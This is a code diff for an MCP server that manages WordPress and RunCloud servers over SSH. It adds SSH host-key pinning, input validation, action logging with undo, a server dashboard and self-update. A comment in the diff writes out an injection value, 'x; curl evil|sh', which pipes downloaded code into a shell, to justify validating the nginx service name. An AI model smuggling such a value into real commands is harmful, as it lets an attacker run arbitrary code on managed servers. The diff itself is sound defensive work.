@@ -6,7 +6,10 @@ import {
   ListToolsRequestSchema,
 } from "@modelcontextprotocol/sdk/types.js";
 import { Client as SSHClient } from "ssh2";
-import { initBrain, logProblem, getBrain, getWebappHistory, incrementKnowledge } from "./core/brain.js";
+import {
+  initBrain, logProblem, getBrain, getWebappHistory, incrementKnowledge,
+  logAction, getRecentActions, getActionForUndo, markActionUndone, searchProblems,
+} from "./core/brain.js";
 import { formatPerchResponse } from "./core/gateway.js";
 import { sshExec as sshExecEnhanced, wpCli, detectWebappType } from "./core/ssh-enhanced.js";
 import { vaultPut, vaultGet, vaultList, vaultDelete, vaultExists } from "./core/vault.js";
@@ -92,6 +95,49 @@ async function paginateAll(path: string): Promise<unknown[]> {
   return results;
 }
 
+// SECURITY [C2]: real trust-on-first-use host fingerprint verification.
+// Fingerprints persist at ~/.perch/known_hosts.json so MITM attempts after
+// first connection are detected and rejected.
+import { createHash as _createHash } from "node:crypto";
+import { existsSync as _existsSync, mkdirSync as _mkdirSync, readFileSync as _readFileSync, writeFileSync as _writeFileSync } from "node:fs";
+import { homedir as _homedir } from "node:os";
+import { join as _join } from "node:path";
+
+const HOST_KEYS_FILE = _join(process.env.PERCH_VAULT_DIR ?? _join(_homedir(), ".perch"), "known_hosts.json");
+
+function loadKnownHosts(): Record<string, string> {
+  if (!_existsSync(HOST_KEYS_FILE)) return {};
+  try { return JSON.parse(_readFileSync(HOST_KEYS_FILE, "utf8")) as Record<string, string>; }
+  catch { return {}; }
+}
+function saveKnownHosts(map: Record<string, string>): void {
+  const dir = _join(_homedir(), ".perch");
+  if (!_existsSync(dir)) _mkdirSync(dir, { recursive: true, mode: 0o700 });
+  _writeFileSync(HOST_KEYS_FILE, JSON.stringify(map, null, 2), { mode: 0o600 });
+}
+function makeHostVerifier(host: string): (key: Buffer) => boolean {
+  return (key: Buffer): boolean => {
+    const fp = _createHash("sha256").update(key).digest("hex");
+    const known = loadKnownHosts();
+    if (process.env.PERCH_SSH_TRUST_NEW_HOSTS === "0" && !known[host]) {
+      // Strict mode: require pre-pinned fingerprint
+      return false;
+    }
+    if (known[host]) {
+      if (known[host] !== fp) {
+        // MITM detected — fingerprint changed. Reject.
+        console.error(`[perch] SSH host fingerprint MISMATCH for ${host} — refusing connection`);
+        return false;
+      }
+      return true;
+    }
+    // First connection — pin and accept (TOFU)
+    known[host] = fp;
+    saveKnownHosts(known);
+    return true;
+  };
+}
+
 // SSH into a server and run a command.
 // Supports password auth OR private key auth.
 // Set privateKey to a PEM string to use key-based auth instead of password.
@@ -129,8 +175,8 @@ async function sshExec(
 
     const connectOpts: Record<string, unknown> = {
       host, port: 22, username, readyTimeout: 10000,
-      // Trust on first use — host key stored per-connection for now
-      hostVerifier: () => true,
+      // SECURITY [C2]: real TOFU verification with persisted fingerprints
+      hostVerifier: makeHostVerifier(host),
     };
     if (usePrivateKey) {
       connectOpts.privateKey = passwordOrKey;
@@ -2058,6 +2104,68 @@ const tools = [
     },
   },
 
+  // ── INTELLIGENCE: search + undo + multi-server + self-update ─────────────
+  {
+    name: "perch_brain_search",
+    description: "Full-text search across all logged problems and their root causes. Returns recent matches with type, cause, fix applied, and outcome. Use when asked 'what do you know about X' or 'have we seen Y before'.",
+    inputSchema: {
+      type: "object",
+      properties: {
+        query: { type: "string", description: "Search terms (FTS5 prefix matching applied)" },
+        limit: { type: "number", description: "Max hits to return. Default 20" },
+      },
+      required: ["query"],
+    },
+  },
+  {
+    name: "perch_actions_log",
+    description: "Show the last N destructive actions Perch has taken (plugin deactivations, file changes, service modifications). Includes undone status and timestamps. Use to audit what Perch did recently.",
+    inputSchema: {
+      type: "object",
+      properties: {
+        limit: { type: "number", description: "How many recent actions. Default 10" },
+      },
+      required: [],
+    },
+  },
+  {
+    name: "perch_undo",
+    description: "Reverse the most recent confirmed destructive action (or a specific one by ID). Currently supports: re-activating a deactivated plugin. Returns what was undone or an error if the action is not undoable.",
+    inputSchema: {
+      type: "object",
+      properties: {
+        actionId: { type: "number", description: "Optional specific action ID. If omitted, undoes the most recent." },
+        host:     { type: "string", description: "SSH host (only needed if the action requires reconnecting)" },
+        username: { type: "string", description: "SSH username" },
+        password: { type: "string" },
+        privateKey: { type: "string" },
+      },
+      required: [],
+    },
+  },
+  {
+    name: "perch_multi_server_dashboard",
+    description: "One-shot summary of all RunCloud-managed servers in your account: status, IP, online/offline, RAM/disk usage from RunCloud's stats endpoint. Returns a compact list ready to render as a Telegram message.",
+    inputSchema: {
+      type: "object",
+      properties: {
+        verbose: { type: "boolean", description: "Include CPU + load detail. Default: false (terse summary)" },
+      },
+      required: [],
+    },
+  },
+  {
+    name: "perch_self_update",
+    description: "Pull the latest Perch source from origin/main, rebuild, and report what changed. Equivalent to running scripts/update.sh. Returns the commit count, version transition, and any notification side-effects.",
+    inputSchema: {
+      type: "object",
+      properties: {
+        dryRun: { type: "boolean", description: "Just check for updates without pulling. Default: false" },
+      },
+      required: [],
+    },
+  },
+
   // ── VAULT (encrypted credential storage) ─────────────────────────────────
   {
     name: "perch_vault_put",
@@ -3199,7 +3307,11 @@ printf "=== Server Status ===\nUptime: %s\nRAM: %sMB / %sMB (%s%% used, %sMB fre
       }
 
       case "ssh_smart_fix": {
-        const nsvc = (a.nginxService as string) || "auto";
+        // SECURITY [C1]: validate nginxService before interpolating into shell.
+        // Without this, an attacker (or buggy MCP caller) could inject arbitrary
+        // commands via nginxService: "x; curl evil|sh".
+        const rawNsvc = (a.nginxService as string) || "auto";
+        const nsvc = rawNsvc === "auto" ? "auto" : validateServiceName(rawNsvc);
         const out = await sshExec(
           a.host as string, a.username as string, a.password as string,
           `ISSUES=(); FIXES=()
@@ -3376,7 +3488,18 @@ ${clearCmd}`,
           ? { type: "key" as const, privateKey: a.privateKey as string }
           : { type: "password" as const, password: (a.password ?? "") as string };
         const sshOpts = { host: a.host as string, username: a.username as string, auth };
-        result = await deactivatePlugin(sshOpts, a.wpPath as string, a.wpUser as string, a.slug as string);
+        const deactRes = await deactivatePlugin(sshOpts, a.wpPath as string, a.wpUser as string, a.slug as string);
+        // Log to actions_log so /perch_undo can reverse this.
+        // Auth secrets are NOT stored — caller must reprovide on undo.
+        logAction(brain, {
+          action_type: "wp_plugin_deactivate",
+          target: (a.domain as string) || (a.host as string),
+          args: { wpPath: a.wpPath, wpUser: a.wpUser, slug: a.slug, host: a.host, username: a.username },
+          before_state: { plugin_was_active: true, slug: a.slug },
+          result: deactRes as unknown as Record<string, unknown>,
+          ok: (deactRes as { success: boolean }).success !== false,
+        });
+        result = deactRes;
         break;
       }
 
@@ -3434,6 +3557,110 @@ ${clearCmd}`,
           : { type: "password" as const, password: (a.password ?? "") as string };
         const sshOpts = { host: a.host as string, username: a.username as string, auth };
         result = await snapshotPerformance(sshOpts, a.wpPath as string, a.wpUser as string, a.domain as string);
+        break;
+      }
+
+      // ── PERCH: BRAIN SEARCH / UNDO / DASHBOARD / UPDATE ─────────────────
+
+      case "perch_brain_search": {
+        const limit = a.limit ? Number(a.limit) : 20;
+        result = searchProblems(brain, a.query as string, limit);
+        break;
+      }
+
+      case "perch_actions_log": {
+        const limit = a.limit ? Number(a.limit) : 10;
+        result = getRecentActions(brain, limit);
+        break;
+      }
+
+      case "perch_undo": {
+        const actionId = a.actionId ? Number(a.actionId) : undefined;
+        const action = getActionForUndo(brain, actionId);
+        if (!action) { result = { ok: false, error: "no undoable action found" }; break; }
+        if (action.action_type === "wp_plugin_deactivate") {
+          const args = action.args as Record<string, unknown>;
+          const auth = a.privateKey
+            ? { type: "key" as const, privateKey: a.privateKey as string }
+            : { type: "password" as const, password: (a.password ?? "") as string };
+          const sshOpts = {
+            host: (a.host as string) || (args.host as string),
+            username: (a.username as string) || (args.username as string),
+            auth,
+          };
+          const wpPath = args.wpPath as string;
+          const wpUser = args.wpUser as string;
+          const slug = args.slug as string;
+          const r = await wpCli(sshOpts, wpPath, wpUser, `plugin activate ${slug}`);
+          markActionUndone(brain, action.id);
+          result = {
+            ok: r.code === 0,
+            undone: { id: action.id, action_type: action.action_type, target: action.target },
+            output: r.stdout || r.stderr,
+          };
+        } else {
+          result = { ok: false, error: `action_type '${action.action_type}' is not undoable yet` };
+        }
+        break;
+      }
+
+      case "perch_multi_server_dashboard": {
+        const verbose = a.verbose === true;
+        const servers = await paginateAll("/servers");
+        const summaries: Array<Record<string, unknown>> = [];
+        for (const s of servers as Array<Record<string, unknown>>) {
+          const sid = s.id as number;
+          let stats: Record<string, unknown> = {};
+          try {
+            stats = (await runcloudRequest("GET", `/servers/${sid}/stats`)) as Record<string, unknown>;
+          } catch { /* keep empty */ }
+          const data = (stats.data as Record<string, unknown>) || stats;
+          summaries.push({
+            id: sid,
+            name: s.name,
+            ip: s.ipAddress,
+            online: s.online,
+            connected: s.connected,
+            ramPct: data.memoryUsage,
+            diskPct: data.diskUsage,
+            cpuPct: verbose ? data.cpuUsage : undefined,
+            load: verbose ? data.loadAverage : undefined,
+          });
+        }
+        result = { ok: true, count: summaries.length, servers: summaries };
+        break;
+      }
+
+      case "perch_self_update": {
+        const dryRun = a.dryRun === true;
+        const { execSync } = await import("node:child_process");
+        try {
+          execSync("git fetch origin", { cwd: process.cwd(), stdio: "pipe" });
+          const localSha = execSync("git rev-parse HEAD", { cwd: process.cwd() }).toString().trim();
+          const remoteSha = execSync("git rev-parse origin/main", { cwd: process.cwd() }).toString().trim();
+          if (localSha === remoteSha) {
+            result = { ok: true, upToDate: true, sha: localSha.slice(0, 7) };
+            break;
+          }
+          const ahead = execSync(`git rev-list --count HEAD..origin/main`, { cwd: process.cwd() }).toString().trim();
+          const log = execSync(`git log --oneline HEAD..origin/main`, { cwd: process.cwd() }).toString().trim();
+          if (dryRun) {
+            result = { ok: true, upToDate: false, dryRun: true, commitsBehind: Number(ahead), changelog: log };
+            break;
+          }
+          execSync("git pull --ff-only origin main && npm install --no-fund --no-audit --silent && npm run build --silent",
+            { cwd: process.cwd(), stdio: "pipe" });
+          const newSha = execSync("git rev-parse HEAD", { cwd: process.cwd() }).toString().trim();
+          result = {
+            ok: true, upToDate: false, dryRun: false,
+            from: localSha.slice(0, 7), to: newSha.slice(0, 7),
+            commitsApplied: Number(ahead),
+            changelog: log,
+            note: "Restart Perch process to load the new build (systemctl restart perch).",
+          };
+        } catch (err) {
+          result = { ok: false, error: err instanceof Error ? err.message : String(err) };
+        }
         break;
       }
 
